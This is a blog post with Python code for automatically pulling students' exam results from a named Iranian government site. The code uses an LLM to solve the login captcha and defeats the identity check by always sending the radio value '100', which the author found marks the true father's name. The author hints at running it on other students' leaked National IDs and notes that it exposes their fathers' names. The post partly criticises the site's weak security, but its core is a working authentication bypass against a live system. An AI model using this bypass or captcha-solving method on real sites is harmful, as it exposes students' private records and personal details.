@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta charset="utf-8">
+<title>Alireza's blog :: Automatic fetching of Payesh results</title>
+<link rel="stylesheet" href="https://cdn.simplecss.org/simple.min.css">
+<link rel="stylesheet" href="/public/css/styles.css">
+<link rel="alternate" type="application/rss+xml" title="RSS Feed for Alireza's blog" href="https://alirezaahani.github.io/rss.xml" />
+    <meta name="description" content="Tinkering around with Gemini and solving Captchas">
+    <meta name="category" content="Technology, AI, Web Development">
+  </head>
+  <body>
+    <header>
+      <h1>Alireza's blog</h1>
+<nav>
+    <a href="/">Index</a>
+    <a href="/pages/about.html">About</a>
+    <a href="https://github.com/alirezaahani">Github</a>
+    <a href="/rss.xml">RSS</a>
+</nav>
+
+    </header>
+    <main>
+      <article>
+        <div>  
+          <h2>Automatic fetching of Payesh results</h2>
+          <time pubdate="pubdate">Published at: 2025/02/10 11:30:00</time>
+          <span>- Category: Technology, AI, Web Development</span> 
+        </div>
+        <p>Tinkering around with Gemini and solving Captchas</p>
+        <h3>Intro</h3>
+<p>In <a href="https://en.wikipedia.org/wiki/National_Organization_for_Development_of_Exceptional_Talents">NODET</a> schools, two rounds of an exam called &quot;Samapad Monitoring (Payesh) Exam&quot; are held for students each academic year. The monitoring exam, also known as the Academic Performance Monitoring Test, is conducted to assess the academic performance of the students.</p>
+<p>The exam for this year was held on Bahman 10th, and the results were released on Bahman 17th. You can find extra info about the exam on <a href="https://payesh.sampad.gov.ir/">The offical website</a>.</p>
+<p>The results are viewable on the <a href="https://karnameh.sampad.gov.ir/">Karnameh</a> website.</p>
+<h3>First (login) page</h3>
+<figure>
+  <img alt="Screenshot of the website" src="/public/images/payesh-karnameh-website/karnameh-website-screenshot.png" style="max-height: 700px !important;"/>
+  <figcaption>The inital login page, showing the sampad logo, asking for your National ID and a Math problem as the captcha solution.</figcaption>
+</figure>
+<p>On closer inspection, the website appears to built with little care, and it was unresposive at the time of release (as expected for most Iranian offical websites). The websites appears to be built using ASP.NET and hosted on a Windows Server with Firewalls, one can only hope they configured it safetly, but that is out of the current topic. </p>
+<p>This page as well as the subsequent pages are littered with the ASP.NET's <code>__VIEWSTATE</code> hidden inputs. I have not looked into the data they contain, but they may contain interesting data.</p>
+<p>The page requests a valid National ID and the numerical solution to the calculation to redirect you to the next page and the next step, obviously if the National ID is wrong or the solution is incorrect, you will get redirected here. </p>
+<p>So..., say you had someone's National ID, many students National IDs ;D
+Doing these steps manually to view or save the results is cumbersome and time consuming, so why don't we automate that?</p>
+<pre style="background-color:#2b303b;">
+<code><span style="color:#c0c5ce;">login_page = </span><span style="color:#8fa1b3;">BeautifulSoup</span><span style="color:#c0c5ce;">(session.</span><span style="color:#8fa1b3;">get</span><span style="color:#c0c5ce;">(&#39;</span><span style="color:#a3be8c;">https://karnameh.sampad.gov.ir/frmStd/loginstdKarname.aspx</span><span style="color:#c0c5ce;">&#39;, </span><span style="color:#bf616a;">headers</span><span style="color:#c0c5ce;">=headers).text, &quot;</span><span style="color:#a3be8c;">html.parser</span><span style="color:#c0c5ce;">&quot;)
+</span><span style="color:#c0c5ce;">params = {input_el[&#39;</span><span style="color:#a3be8c;">name</span><span style="color:#c0c5ce;">&#39;]: input_el.</span><span style="color:#8fa1b3;">get</span><span style="color:#c0c5ce;">(&#39;</span><span style="color:#a3be8c;">value</span><span style="color:#c0c5ce;">&#39;) </span><span style="color:#b48ead;">for </span><span style="color:#c0c5ce;">input_el </span><span style="color:#b48ead;">in </span><span style="color:#c0c5ce;">login_page.</span><span style="color:#8fa1b3;">find_all</span><span style="color:#c0c5ce;">(&#39;</span><span style="color:#a3be8c;">input</span><span style="color:#c0c5ce;">&#39;)}
+</span><span style="color:#c0c5ce;">captcha_text = login_page.</span><span style="color:#8fa1b3;">find</span><span style="color:#c0c5ce;">(&#39;</span><span style="color:#a3be8c;">span</span><span style="color:#c0c5ce;">&#39;, </span><span style="color:#bf616a;">id</span><span style="color:#c0c5ce;">=&#39;</span><span style="color:#a3be8c;">lmsg</span><span style="color:#c0c5ce;">&#39;).text
+</span></code></pre>
+<p>To begin we will send a request to the login page, parse the response html with <code>bs4</code> and collect all the input parameters and the catpcha text.</p>
+<p>So now we need to solve the captcha. If I was doing this 2 or 3 years ago, I would have said: </p>
+<blockquote>
+<p>Let's build a NLP solution to convert the problem from language to a mathmatical expression and solve that.</p>
+</blockquote>
+<p>but they say today is the age of AI, blah, blah, ... So let's throw a LLM at it. </p>
+<p>Google has made their <code>gemini-2.0-flash-lite-preview-02-05</code> model free for everyone to use, even with a free API key. And by everyone I mean every person who isn't doomed to live in Iran :D </p>
+<p>Because of sanctions I cannot use the Google AI Studio APIs, but need not worry! as useless and blood sucking Iranian companies are here to make profit out of that!</p>
+<p>Anyway, I am going to use <a href="https://avalai.ir/">AvalAI</a>, they provide the free services too, you just have to trust them with your identity and we know how that goes with Iran. </p>
+<p>Thankfully they use OpenAI's api and not their own cryptic and useless APIs unlike other companies. So here is the function to solve the captcha: </p>
+<pre style="background-color:#2b303b;">
+<code><span style="color:#bf616a;">BASE_URL </span><span style="color:#c0c5ce;">= &quot;</span><span style="color:#a3be8c;">https://api.avalai.ir/v1</span><span style="color:#c0c5ce;">&quot; </span><span style="color:#65737e;"># THANKS TO AVALAI FOR FREE API
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">client = </span><span style="color:#8fa1b3;">OpenAI</span><span style="color:#c0c5ce;">(
+</span><span style="color:#c0c5ce;">    </span><span style="color:#bf616a;">api_key</span><span style="color:#c0c5ce;">=</span><span style="color:#bf616a;">API_KEY</span><span style="color:#c0c5ce;">,
+</span><span style="color:#c0c5ce;">    </span><span style="color:#bf616a;">base_url</span><span style="color:#c0c5ce;">=</span><span style="color:#bf616a;">BASE_URL</span><span style="color:#c0c5ce;">,
+</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">solve_captcha</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">captcha</span><span style="color:#c0c5ce;">: str) -&gt; int:
+</span><span style="color:#c0c5ce;">    chat_completion = client.chat.completions.</span><span style="color:#8fa1b3;">create</span><span style="color:#c0c5ce;">(
+</span><span style="color:#c0c5ce;">        </span><span style="color:#bf616a;">messages</span><span style="color:#c0c5ce;">=[
+</span><span style="color:#c0c5ce;">            {
+</span><span style="color:#c0c5ce;">                &quot;</span><span style="color:#a3be8c;">role</span><span style="color:#c0c5ce;">&quot;: &quot;</span><span style="color:#a3be8c;">system</span><span style="color:#c0c5ce;">&quot;,
+</span><span style="color:#c0c5ce;">                &quot;</span><span style="color:#a3be8c;">content</span><span style="color:#c0c5ce;">&quot;: &quot;</span><span style="color:#a3be8c;">تو یک مدل هوش مصنوعی، مخصوص حل مسائل ریاضی هستی و با دقت تمام و با رعایت ترتیب عملگرد ها، ابتدا سوال را متوجه شده و پس از محاسبه پاسخ می دهی. مسائله ای که کاربر به تو ارسال می کند را حل کن  و فقط پاسخ نهایی را به شکل یک عدد بده.</span><span style="color:#c0c5ce;">&quot;
+</span><span style="color:#c0c5ce;">            },
+</span><span style="color:#c0c5ce;">            {
+</span><span style="color:#c0c5ce;">                &quot;</span><span style="color:#a3be8c;">role</span><span style="color:#c0c5ce;">&quot;: &quot;</span><span style="color:#a3be8c;">user</span><span style="color:#c0c5ce;">&quot;,
+</span><span style="color:#c0c5ce;">                &quot;</span><span style="color:#a3be8c;">content</span><span style="color:#c0c5ce;">&quot;: captcha,
+</span><span style="color:#c0c5ce;">            }
+</span><span style="color:#c0c5ce;">        ],
+</span><span style="color:#c0c5ce;">        </span><span style="color:#bf616a;">model</span><span style="color:#c0c5ce;">=&quot;</span><span style="color:#a3be8c;">gemini-2.0-flash-lite-preview-02-05</span><span style="color:#c0c5ce;">&quot;
+</span><span style="color:#c0c5ce;">    )
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return </span><span style="color:#c0c5ce;">int(chat_completion.choices[</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">].message.content.</span><span style="color:#8fa1b3;">strip</span><span style="color:#c0c5ce;">())
+</span></code></pre>
+<p>I have given it a Persian system prompt, so it doesn't get surprised when met with the actual problem. 
+Here is the prompt: </p>
+<blockquote>
+<p>&quot;You are an artificial intelligence model specifically designed to solve mathematical problems. You understand the question with complete accuracy and follow the order of operations, then calculate and provide the answer. Solve the problem that the user sends you and give only the final answer as a number.&quot;</p>
+</blockquote>
+<p>You may cry and say, why didn't you set the <code>temperature</code> to <code>0.0</code>, why don't you use function calling, json schema, <code>langchain</code>, <code>pydantic</code> ...</p>
+<p>This is just a simple script. I have tested it for 100 instances and it works, so shut up.</p>
+<pre style="background-color:#2b303b;">
+<code><span style="color:#c0c5ce;">captcha_solution = </span><span style="color:#8fa1b3;">solve_captcha</span><span style="color:#c0c5ce;">(captcha_text)
+</span><span style="color:#c0c5ce;">logger.</span><span style="color:#8fa1b3;">info</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">f</span><span style="color:#c0c5ce;">&#39;</span><span style="color:#a3be8c;">Captcha solution: </span><span style="color:#c0c5ce;">{captcha_solution}&#39;)
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">params[&#39;</span><span style="color:#a3be8c;">txtUserName</span><span style="color:#c0c5ce;">&#39;] = </span><span style="color:#bf616a;">NATIONAL_ID
+</span><span style="color:#c0c5ce;">params[&#39;</span><span style="color:#a3be8c;">txtPassword</span><span style="color:#c0c5ce;">&#39;] = captcha_solution </span><span style="color:#65737e;"># LOL What a joke
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">verification_page = </span><span style="color:#8fa1b3;">BeautifulSoup</span><span style="color:#c0c5ce;">(session.</span><span style="color:#8fa1b3;">post</span><span style="color:#c0c5ce;">(&#39;</span><span style="color:#a3be8c;">https://karnameh.sampad.gov.ir/frmStd/loginstdKarname.aspx</span><span style="color:#c0c5ce;">&#39;, </span><span style="color:#bf616a;">headers</span><span style="color:#c0c5ce;">=headers, </span><span style="color:#bf616a;">data</span><span style="color:#c0c5ce;">=params).text, &quot;</span><span style="color:#a3be8c;">html.parser</span><span style="color:#c0c5ce;">&quot;)
+</span></code></pre>
+<p>After that we just solve the captcha, fill in the needed params and send a request to proceed to the next step.</p>
+<h3>Second (verfication) page</h3>
+<p>So after all that, we arrive at the next step. In this step you have to choose the <strong>father name</strong> for the specified National ID to verify that you are trusted to view the results.</p>
+<p>I am not going to go in much detail about how <strong>STUPID</strong> this way of verification is. You would expect for <em>Organization for Development of Exceptional Talents</em> there would be a better verificaiton system! </p>
+<p>The first strategy that came to my mind way to just keep repeating the request to the page, record a list of sets of the seen father names and take intersections until there is only one name left. This is hilariously simple. </p>
+<p>But you know what is more <strong>hilarious (frustrating)</strong>? </p>
+<p>If you just insepct the page, here is a sample of the list: </p>
+<pre style="background-color:#2b303b;">
+<code><span style="color:#c0c5ce;">&lt;</span><span style="color:#bf616a;">tbody</span><span style="color:#c0c5ce;">&gt;&lt;</span><span style="color:#bf616a;">tr</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#c0c5ce;">		&lt;</span><span style="color:#bf616a;">td</span><span style="color:#c0c5ce;">&gt;&lt;</span><span style="color:#bf616a;">input </span><span style="color:#8fa1b3;">id</span><span style="color:#c0c5ce;">=&quot;</span><span style="color:#a3be8c;">rName_0</span><span style="color:#c0c5ce;">&quot; </span><span style="color:#d08770;">type</span><span style="color:#c0c5ce;">=&quot;</span><span style="color:#a3be8c;">radio</span><span style="color:#c0c5ce;">&quot; </span><span style="color:#d08770;">name</span><span style="color:#c0c5ce;">=&quot;</span><span style="color:#a3be8c;">rName</span><span style="color:#c0c5ce;">&quot; </span><span style="color:#d08770;">value</span><span style="color:#c0c5ce;">=&quot;</span><span style="color:#a3be8c;">100</span><span style="color:#c0c5ce;">&quot;&gt;&lt;</span><span style="color:#bf616a;">label </span><span style="color:#d08770;">for</span><span style="color:#c0c5ce;">=&quot;</span><span style="color:#a3be8c;">rName_0</span><span style="color:#c0c5ce;">&quot;&gt;[REDACTED TRUE NAME]&lt;/</span><span style="color:#bf616a;">label</span><span style="color:#c0c5ce;">&gt;&lt;/</span><span style="color:#bf616a;">td</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#c0c5ce;">	&lt;/</span><span style="color:#bf616a;">tr</span><span style="color:#c0c5ce;">&gt;&lt;</span><span style="color:#bf616a;">tr</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#c0c5ce;">		&lt;</span><span style="color:#bf616a;">td</span><span style="color:#c0c5ce;">&gt;&lt;</span><span style="color:#bf616a;">input </span><span style="color:#8fa1b3;">id</span><span style="color:#c0c5ce;">=&quot;</span><span style="color:#a3be8c;">rName_1</span><span style="color:#c0c5ce;">&quot; </span><span style="color:#d08770;">type</span><span style="color:#c0c5ce;">=&quot;</span><span style="color:#a3be8c;">radio</span><span style="color:#c0c5ce;">&quot; </span><span style="color:#d08770;">name</span><span style="color:#c0c5ce;">=&quot;</span><span style="color:#a3be8c;">rName</span><span style="color:#c0c5ce;">&quot; </span><span style="color:#d08770;">value</span><span style="color:#c0c5ce;">=&quot;</span><span style="color:#a3be8c;">11</span><span style="color:#c0c5ce;">&quot;&gt;&lt;</span><span style="color:#bf616a;">label </span><span style="color:#d08770;">for</span><span style="color:#c0c5ce;">=&quot;</span><span style="color:#a3be8c;">rName_1</span><span style="color:#c0c5ce;">&quot;&gt;[REDACTED NAME]&lt;/</span><span style="color:#bf616a;">label</span><span style="color:#c0c5ce;">&gt;&lt;/</span><span style="color:#bf616a;">td</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#c0c5ce;">	&lt;/</span><span style="color:#bf616a;">tr</span><span style="color:#c0c5ce;">&gt;&lt;</span><span style="color:#bf616a;">tr</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#c0c5ce;">		&lt;</span><span style="color:#bf616a;">td</span><span style="color:#c0c5ce;">&gt;&lt;</span><span style="color:#bf616a;">input </span><span style="color:#8fa1b3;">id</span><span style="color:#c0c5ce;">=&quot;</span><span style="color:#a3be8c;">rName_2</span><span style="color:#c0c5ce;">&quot; </span><span style="color:#d08770;">type</span><span style="color:#c0c5ce;">=&quot;</span><span style="color:#a3be8c;">radio</span><span style="color:#c0c5ce;">&quot; </span><span style="color:#d08770;">name</span><span style="color:#c0c5ce;">=&quot;</span><span style="color:#a3be8c;">rName</span><span style="color:#c0c5ce;">&quot; </span><span style="color:#d08770;">value</span><span style="color:#c0c5ce;">=&quot;</span><span style="color:#a3be8c;">14</span><span style="color:#c0c5ce;">&quot;&gt;&lt;</span><span style="color:#bf616a;">label </span><span style="color:#d08770;">for</span><span style="color:#c0c5ce;">=&quot;</span><span style="color:#a3be8c;">rName_2</span><span style="color:#c0c5ce;">&quot;&gt;[REDACTED NAME]&lt;/</span><span style="color:#bf616a;">label</span><span style="color:#c0c5ce;">&gt;&lt;/</span><span style="color:#bf616a;">td</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#c0c5ce;">	&lt;/</span><span style="color:#bf616a;">tr</span><span style="color:#c0c5ce;">&gt;&lt;</span><span style="color:#bf616a;">tr</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#c0c5ce;">		&lt;</span><span style="color:#bf616a;">td</span><span style="color:#c0c5ce;">&gt;&lt;</span><span style="color:#bf616a;">input </span><span style="color:#8fa1b3;">id</span><span style="color:#c0c5ce;">=&quot;</span><span style="color:#a3be8c;">rName_3</span><span style="color:#c0c5ce;">&quot; </span><span style="color:#d08770;">type</span><span style="color:#c0c5ce;">=&quot;</span><span style="color:#a3be8c;">radio</span><span style="color:#c0c5ce;">&quot; </span><span style="color:#d08770;">name</span><span style="color:#c0c5ce;">=&quot;</span><span style="color:#a3be8c;">rName</span><span style="color:#c0c5ce;">&quot; </span><span style="color:#d08770;">value</span><span style="color:#c0c5ce;">=&quot;</span><span style="color:#a3be8c;">7</span><span style="color:#c0c5ce;">&quot;&gt;&lt;</span><span style="color:#bf616a;">label </span><span style="color:#d08770;">for</span><span style="color:#c0c5ce;">=&quot;</span><span style="color:#a3be8c;">rName_3</span><span style="color:#c0c5ce;">&quot;&gt;[REDACTED NAME]&lt;/</span><span style="color:#bf616a;">label</span><span style="color:#c0c5ce;">&gt;&lt;/</span><span style="color:#bf616a;">td</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#c0c5ce;">	&lt;/</span><span style="color:#bf616a;">tr</span><span style="color:#c0c5ce;">&gt;&lt;</span><span style="color:#bf616a;">tr</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#c0c5ce;">		&lt;</span><span style="color:#bf616a;">td</span><span style="color:#c0c5ce;">&gt;&lt;</span><span style="color:#bf616a;">input </span><span style="color:#8fa1b3;">id</span><span style="color:#c0c5ce;">=&quot;</span><span style="color:#a3be8c;">rName_4</span><span style="color:#c0c5ce;">&quot; </span><span style="color:#d08770;">type</span><span style="color:#c0c5ce;">=&quot;</span><span style="color:#a3be8c;">radio</span><span style="color:#c0c5ce;">&quot; </span><span style="color:#d08770;">name</span><span style="color:#c0c5ce;">=&quot;</span><span style="color:#a3be8c;">rName</span><span style="color:#c0c5ce;">&quot; </span><span style="color:#d08770;">value</span><span style="color:#c0c5ce;">=&quot;</span><span style="color:#a3be8c;">21</span><span style="color:#c0c5ce;">&quot;&gt;&lt;</span><span style="color:#bf616a;">label </span><span style="color:#d08770;">for</span><span style="color:#c0c5ce;">=&quot;</span><span style="color:#a3be8c;">rName_4</span><span style="color:#c0c5ce;">&quot;&gt;[REDACTED NAME]&lt;/</span><span style="color:#bf616a;">label</span><span style="color:#c0c5ce;">&gt;&lt;/</span><span style="color:#bf616a;">td</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#c0c5ce;">	&lt;/</span><span style="color:#bf616a;">tr</span><span style="color:#c0c5ce;">&gt;&lt;</span><span style="color:#bf616a;">tr</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#c0c5ce;">		&lt;</span><span style="color:#bf616a;">td</span><span style="color:#c0c5ce;">&gt;&lt;</span><span style="color:#bf616a;">input </span><span style="color:#8fa1b3;">id</span><span style="color:#c0c5ce;">=&quot;</span><span style="color:#a3be8c;">rName_5</span><span style="color:#c0c5ce;">&quot; </span><span style="color:#d08770;">type</span><span style="color:#c0c5ce;">=&quot;</span><span style="color:#a3be8c;">radio</span><span style="color:#c0c5ce;">&quot; </span><span style="color:#d08770;">name</span><span style="color:#c0c5ce;">=&quot;</span><span style="color:#a3be8c;">rName</span><span style="color:#c0c5ce;">&quot; </span><span style="color:#d08770;">value</span><span style="color:#c0c5ce;">=&quot;</span><span style="color:#a3be8c;">34</span><span style="color:#c0c5ce;">&quot;&gt;&lt;</span><span style="color:#bf616a;">label </span><span style="color:#d08770;">for</span><span style="color:#c0c5ce;">=&quot;</span><span style="color:#a3be8c;">rName_5</span><span style="color:#c0c5ce;">&quot;&gt;[REDACTED NAME]&lt;/</span><span style="color:#bf616a;">label</span><span style="color:#c0c5ce;">&gt;&lt;/</span><span style="color:#bf616a;">td</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#c0c5ce;">	&lt;/</span><span style="color:#bf616a;">tr</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#c0c5ce;">&lt;/</span><span style="color:#bf616a;">tbody</span><span style="color:#c0c5ce;">&gt;
+</span></code></pre>
+<p>If you retry this a couple of times, you will see that the true name's ID is just always <code>100</code>!</p>
+<p>This is just so wrong on many levels. These people trusted you with their sensitive credentials and this is how you treat them. </p>
+<p>Using this, not only you can view the results with only the National ID, you can even find the person's father name!</p>
+<p>Other viewers outside Iran might not understand this, but our National IDs are just floating around in so many leaks, you can check for yourself on <a href="https://leakfa.com">leakfa</a>.</p>
+<p>So to by pass this step you only need to send a <code>100</code> as the selected father name. What a joke.</p>
+<pre style="background-color:#2b303b;">
+<code><span style="color:#c0c5ce;">params = {input_el[&#39;</span><span style="color:#a3be8c;">name</span><span style="color:#c0c5ce;">&#39;]: input_el.</span><span style="color:#8fa1b3;">get</span><span style="color:#c0c5ce;">(&#39;</span><span style="color:#a3be8c;">value</span><span style="color:#c0c5ce;">&#39;) </span><span style="color:#b48ead;">for </span><span style="color:#c0c5ce;">input_el </span><span style="color:#b48ead;">in </span><span style="color:#c0c5ce;">verification_page.</span><span style="color:#8fa1b3;">find_all</span><span style="color:#c0c5ce;">(&#39;</span><span style="color:#a3be8c;">input</span><span style="color:#c0c5ce;">&#39;)}
+</span><span style="color:#c0c5ce;">params[&#39;</span><span style="color:#a3be8c;">rName</span><span style="color:#c0c5ce;">&#39;] = &#39;</span><span style="color:#a3be8c;">100</span><span style="color:#c0c5ce;">&#39; </span><span style="color:#65737e;"># WHAT A JOKE
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">session.</span><span style="color:#8fa1b3;">post</span><span style="color:#c0c5ce;">(&#39;</span><span style="color:#a3be8c;">https://karnameh.sampad.gov.ir/frmStd/loginstdKarname.aspx</span><span style="color:#c0c5ce;">&#39;, </span><span style="color:#bf616a;">headers</span><span style="color:#c0c5ce;">=headers, </span><span style="color:#bf616a;">data</span><span style="color:#c0c5ce;">=params)
+</span><span style="color:#c0c5ce;">results_page = session.</span><span style="color:#8fa1b3;">get</span><span style="color:#c0c5ce;">(&#39;</span><span style="color:#a3be8c;">https://karnameh.sampad.gov.ir/karnameh/stdKarnameh.aspx</span><span style="color:#c0c5ce;">&#39;, </span><span style="color:#bf616a;">headers</span><span style="color:#c0c5ce;">=headers).text
+</span><span style="color:#c0c5ce;">results_page = results_page.</span><span style="color:#8fa1b3;">replace</span><span style="color:#c0c5ce;">(&#39;</span><span style="color:#a3be8c;">../</span><span style="color:#c0c5ce;">&#39;, &#39;</span><span style="color:#a3be8c;">https://karnameh.sampad.gov.ir/</span><span style="color:#c0c5ce;">&#39;)
+</span></code></pre>
+<p>After that we fetch the results and save them or view them. </p>
+<p>The state of web development and security in Iran is very concerning.</p>
+
+      </article>
+    </main>
+    <footer>
+      <p>Updated at: 2025/02/10 09:08:05</p>
+    </footer>
+  </body>
+</html>
